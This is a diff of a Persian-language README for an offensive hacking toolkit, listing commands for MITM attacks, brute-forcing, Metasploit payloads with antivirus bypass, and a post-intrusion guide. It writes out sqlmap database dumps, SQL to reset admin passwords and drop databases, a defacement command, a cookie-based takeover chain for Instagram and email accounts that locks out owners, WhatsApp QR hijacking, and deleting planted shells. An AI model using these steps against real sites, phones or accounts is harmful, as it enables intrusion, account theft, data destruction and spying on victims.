 ### mitm-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `proxy` | پروکسی شنود | `mitmproxy` | MED |
-| `arp` | ARP spoof | `bettercap` | HIGH |
-| `dns` | مسموم‌سازی DNS | `bettercap` | HIGH |
-| `tls` | شنود TLS | `tcpdump` | MED |
-| `captive` | پورتال جعلی | `wifiphisher` | HIGH |
-| `ngrok` | نمایش سرویس محلی | `ngrok` | MED |
+- proxy — پروکسی شنود. mitmproxy. MED
+- arp — ARP spoof. bettercap. HIGH
+- dns — مسموم‌سازی DNS. bettercap. HIGH
+- tls — شنود TLS. tcpdump. MED
+- captive — پورتال جعلی. wifiphisher. HIGH
+- ngrok — سرویس محلی. ngrok. MED
 
 ### password-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `generate` | وردلیست هدفمند | `cupp` | LOW |
-| `rule` | قاعده mutation | `hashcat` | LOW |
-| `hydra` | بروت‌فورس سرویس | `hydra` | HIGH |
-| `hashid` | تشخیص نوع هش | `hashid` | LOW |
-| `hashcrack` | کرک هش | `hashcat` | LOW |
-| `cupp` | وردلیست از اطلاعات هدف | `cupp` | LOW |
+- generate — وردلیست. cupp. LOW
+- rule — قاعده mutation. hashcat. LOW
+- hydra — بروت‌فورس. hydra. HIGH
+- hashid — نوع هش. hashid. LOW
+- hashcrack — کرک هش. hashcat. LOW
+- cupp — وردلیست هدفمند. cupp. LOW
 
 ### c2-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `msf` | شنونده مترپرتر | `msfconsole` | MED |
-| `venom` | پیلود چندسکویی | `msfvenom` | HIGH |
-| `stager` | پیلود استیجر | `msfvenom` | HIGH |
-| `encode` | بایپس آنتی‌ویروس | `msfvenom` `upx` | HIGH |
-| `listen` | شنونده خام | `nc` | LOW |
-| `transfer` | انتقال پیلود | `python3` | MED |
+- msf — شنونده. msfconsole. MED
+- venom — پیلود. msfvenom. HIGH
+- stager — استیجر. msfvenom. HIGH
+- encode — بایپس AV. msfvenom. HIGH
+- listen — شنونده خام. nc. LOW
+- transfer — انتقال پیلود. python3. MED
 
-## بعد از نفوذ: چه کاری می‌شود کرد
-
-هر سطح دسترسی، کارهای متفاوتی را باز می‌کند. این جدول واقعیت است، نه تبلیغ.
+## بعد از نفوذ
 
 ### وبسایت
 
-| اگر داری | می‌توانی | نمی‌توانی |
-|---|---|---|
-| SQLi | دیتابیس را dump کنی | صفحه را عوض کنی |
-| پنل ادمین | محتوا، کاربر، پلاگین | فایل سرور (مگر آپلود شل) |
-| RCE / شل | هر فایل، دیفیس، کران | دامنه را |
-| اکانت registrar | NS را عوض کنی، سایت را کامل ببری | — |
+- با SQLi می‌توانی دیتابیس را dump کنی. صفحه را نمی‌توانی عوض کنی.
+- با پنل ادمین محتوا و کاربر را می‌توانی. فایل سرور را نه.
+- با RCE هر فایل و دیفیس. دامنه را نه.
+- با اکانت registrar می‌توانی NS را عوض کنی.
 
-**گرفتن دیتابیس:**
+    sqlmap -u "URL" --batch --dump-all --output-dir=backup
 
-```bash
-sqlmap -u "URL" --batch --dbs
-sqlmap -u "URL" --batch -D dbname --tables
-sqlmap -u "URL" --batch -D dbname -T users --dump
-sqlmap -u "URL" --batch --dump-all --output-dir=backup
-```
+    UPDATE users SET password = '<hash>' WHERE username = 'admin';
+    DROP DATABASE dbname;
 
-**تغییر رمز ادمین از داخل دیتابیس:**
+    cp index.php index.php.bak
+    echo '<h1>pwned</h1>' > index.php
 
-```sql
-UPDATE users SET password = '<hash>' WHERE username = 'admin';
--- وردپرس: hash با
-php -r 'echo password_hash("newpass", PASSWORD_BCRYPT), "\n";'
-```
+اول dump-all، بعد DROP.
 
-**ساخت ادمین جدید:**
+مالکیت سه چیز جداست: محتوا، سرور، دامنه. دامنه از هک سایت به‌دست نمی‌آید.
 
-```sql
-INSERT INTO users (username, password, email, role) VALUES ('x', '<hash>', 'a@b.c', 'admin');
-```
+### اکانت
 
-**دیفیس:**
+با کوکی سشن:
 
-```bash
-cp index.php index.php.bak
-echo '<h1>pwned</h1>' > index.php
-# یا بدون دسترسی فایل:
-# .htaccess → RedirectMatch 302 ^/$ /defaced.html
-```
+    کوکی → تغییر ایمیل به ایمیل خودت
+          → Forgot password → کد به ایمیل جدید
+          → رمز جدید → 2FA → Revoke all sessions
 
-**پاک کردن دیتابیس:**
+اول ایمیل، بعد رمز. برعکس کنی، کد به ایمیل قدیمی می‌رود و گیر می‌کنی.
 
-```sql
-DROP DATABASE dbname;
--- یا فقط جدول:
-DROP TABLE users;
-```
-
-قاعده: **اول `--dump-all`، بعد DROP.** بدون بکاپ، حذف خودکشی است.
-
-**«صاحب سایت شدن» سه چیز جداست:**
-
-| مالکیت | چطور | برگشت‌پذیر؟ |
-|---|---|---|
-| محتوا | پنل ادمین / شل | بله، طرف ریستور می‌کند |
-| سرور | RCE | بله با ری‌اینستال |
-| دامنه | اکانت registrar یا NS | فقط با داوری/شکایت |
-
-کنترل دامنه از هک سایت به‌دست نمی‌آید. طرف می‌تواند دامنه را به سرور دیگر ببرد و تو با شل و دیتابیس دست خالی بمانی.
-
-### اینستاگرام / اکانت
-
-با کوکی سشن از `evilginx2`:
-
-| کار | نیاز | نتیجه |
-|---|---|---|
-| خواندن دایرکت | کوکی | — |
-| تغییر ایمیل | کوکی + ایمیل جدید خودت | مالک بیرون می‌شود |
-| تغییر پسورد | کوکی، بعد تغییر ایمیل | قفل کامل |
-| روشن کردن 2FA | کوکی | برگشت سخت |
-| بیرون کردن سشن‌ها | کوکی | مالک مجبور به ورود دوباره |
-
-زنجیره‌ی تصاحب:
-
-```text
-کوکی → Settings → تغییر ایمیل به ایمیل خودت
-      → Forgot password → کد به ایمیل جدید
-      → رمز جدید → 2FA → Revoke all sessions
-```
-
-ترتیب مهم است. اگر اول رمز را عوض کنی، برای تغییر ایمیل باید رمز را بدانی — که داری، ولی کد تأیید به ایمیل قدیمی می‌رود و گیر می‌کنی. **اول ایمیل، بعد رمز.**
-
-**واتساپ:** رمز ندارد. با QR می‌توانی چت بخوانی، پیام بفرستی، چت اکسپورت کنی. تا وقتی مالک دستگاه متصل را حذف نکرده، دسترسی داری. تغییر شماره نیاز به OTP دارد.
-
-### ایمیل
-
-با کوکی سشن: تغییر ایمیل بازیابی → تغییر رمز → 2FA → revoke. همان زنجیره.
-
-با `hydra` یا `o365spray` فقط اگر رمز در وردلیست باشد.
+واتساپ رمز ندارد. با QR چت می‌خوانی. تا حذف دستگاه از طرف مالک، دسترسی داری.
 
 ### گوشی
 
-| داری | می‌توانی | نمی‌توانی |
-|---|---|---|
-| ADB | فایل، دوربین، صفحه، نصب اپ، پیامک | رمز گوگل، چت واتساپ |
-| ADB + پیامک | ریست جیمیل → اکانت گوگل | قفل صفحه |
-| RAT | همان + ماندگاری + میکروفن | همان محدودیت‌ها |
-
-### وایفای
-
-کرک هندشیک = اتصال به شبکه و اینترنت. پنل روتر مال تو نیست، مگر پسورد پیش‌فرض بزنی.
-
-### دوربین
-
-استریم و عکس بله. تغییر تنظیمات فقط با ورود به پنل.
+- با ADB فایل و دوربین و پیامک. رمز گوگل و چت واتساپ نه.
+- با ADB و پیامک می‌توانی جیمیل را ریست کنی. قفل صفحه را نه.
 
 ## اثر باقی‌مانده
 
-هیچ کاری بی‌اثر نیست. اینها را انتظار داشته باش:
+- اسکن پورت — در لاگ فایروال
+- SQLi — کوئری سنگین در لاگ
+- فازینگ — هزاران ۴۰۴
+- نصب RAT — فایل ناشناس، مصرف باتری
+- تغییر رمز — ایمیل هشدار
+- دیفیس — فوراً دیده می‌شود
 
-| کار | طرف چه می‌فهمد |
-|---|---|
-| اسکن پورت | در لاگ فایروال/سرور |
-| SQLi | کوئری‌های سنگین در لاگ دیتابیس |
-| فازینگ | هزاران ۴۰۴ در لاگ وب |
-| نصب RAT | فایل ناشناس در گوشی، مصرف باتری |
-| تغییر رمز | ایمیل «رمز شما تغییر کرد» |
-| تغییر ایمیل | ایمیل به آدرس قدیمی |
-| دیفیس | فوراً دیده می‌شود |
-| DROP TABLE | سایت می‌افتد |
+پاک کردن اثر کامل ممکن نیست. لاگ سرور دست تو نیست.
 
-**پاک‌سازی:**
+## ممکن و ناممکن
 
-```bash
-# فایل‌های موقت روی سرور
-rm -f /tmp/*.sh /var/www/html/shell.php
+ممکن:
 
-# برگرداندن صفحه
-cp index.php.bak index.php
+- ADB بی‌سیم با دیباگ روشن
+- Meterpreter با نصب کاربر
+- RTSP روی دوربین در شبکه
+- evilginx2 با کلیک کاربر
+- هندشیک با کارت monitor mode
 
-# حذف کاربر ساخته‌شده
-# از پنل یا دیتابیس
-```
-
-**پاک کردن اثر کامل ممکن نیست.** لاگ سرور دست تو نیست.
-
-## چه چیزهایی واقعاً ممکن است
-
-| هدف | روش | شرط |
-|---|---|---|
-| گوشی اندروید | ADB بی‌سیم | دیباگ بی‌سیم روشن |
-| گوشی اندروید | Meterpreter | کاربر نصب و باز کند |
-| ویندوز | Meterpreter | کاربر اجرا کند |
-| دوربین IP | RTSP/HTTP | در شبکه باشد |
-| اکانت | evilginx2 | کاربر لینک را باز کند |
-| وای‌فای | handshake/pmkid | کارت با monitor mode |
-
-و این‌ها **ممکن نیست**:
+ناممکن:
 
 - هک اینستا فقط با یوزرنیم
-- خواندن پیامک اندروید ۱۳+ بدون روت
-- دیدن صفحه‌ی گوشی بدون ADB یا RAT
-- هک وای‌فای بدون مانیتور مود
+- پیامک اندروید ۱۳+ بدون روت
+- صفحه‌ی گوشی بدون ADB یا RAT
+- وای‌فای بدون مانیتور مود
 - DDoS واقعی از یک لپ‌تاپ
-
-جزئیات: [docs/REALITY.md](docs/REALITY.md)
 
 ## عیب‌یابی
 
-| مشکل | حل |
-|---|---|
-| `دسته نبود` | `hack list` بزن، نام دقیق را بردار |
-| `نصب نیست` | `bash install.sh` یا بسته را دستی نصب کن |
-| `adb: no devices` | `adb kill-server && adb start-server` |
-| خروجی دوربین سیاه | اپ دوربین را یک‌بار روی گوشی باز کن |
-| `monitor mode` خطا | `sudo airmon-ng check kill` |
-| `nuclei` کند | `-rl 10` |
-| سایت ۵۰۳ داد | نرخ را نصف کن، ۵ دقیقه صبر |
-| `permission denied` | `chmod +x hack install.sh */*.sh` |
+- دسته نبود ← hack list
+- نصب نیست ← hack install
+- Permission denied ← chmod +x hack install.sh update.sh
+- adb: no devices ← adb kill-server && adb start-server
+- دوربین سیاه ← اپ دوربین را باز کن
+- monitor mode ← sudo airmon-ng check kill
+- nuclei کند ← -rl 10
+- خطای ۵۰۳ ← نرخ را نصف کن، ۵ دقیقه صبر
+- lib/common.sh نبود ← ln -sf ~/hack2/hack $PREFIX/bin/hack
+- نصب بسته شکست خورد ← cat /tmp/hackit-install.log
+- apt خراب ← apt-get -f install -y
 
 ## مجوز
 
-MIT — برای کد خود مخزن. هر ابزار لایسنس خودش را دارد.
+MIT — برای کد مخزن. هر ابزار لایسنس خودش را دارد.
